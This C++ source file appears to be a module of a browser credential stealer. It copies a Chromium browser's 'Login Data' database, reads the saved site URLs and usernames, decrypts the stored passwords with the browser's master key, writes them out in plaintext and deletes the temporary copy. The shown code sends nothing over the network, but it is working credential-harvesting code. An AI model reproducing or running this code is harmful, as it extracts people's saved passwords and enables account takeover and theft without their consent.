//
// Created by .1qxz on 08.06.2024.
//

#include "CPasswords.h"

void CPasswords::execute(const fs::path &root, const std::string &name, const fs::path &browser_root) {
    fs::path orig_db_path = this->getProfileDir(browser_root) / "Login Data";
    fs::path copied_db = FilesUtil::copyTemporary(orig_db_path);

    if(!exists(copied_db))
        return;

    std::list<std::unique_ptr<Entity>> passwords;

    SQLiteUtil::connectAndRead("SELECT origin_url, username_value, password_value FROM logins ORDER BY times_used DESC", copied_db, [this, &passwords](sqlite3_stmt *stmt) {
        auto password = std::make_unique<Password>();
        password->origin = SQLiteUtil::readString(stmt, 0);
        password->username = SQLiteUtil::readString(stmt, 1);

        std::vector<BYTE> master_key = this->getMasterKey();
        std::string decoded_password = ChromiumUtil::decryptData(SQLiteUtil::readBytes(stmt, 2), master_key);
        password->password = decoded_password;

        passwords.push_back(std::move(password));
    });

    fs::remove(copied_db);
    Entity::writeSelf(root, passwords);
}
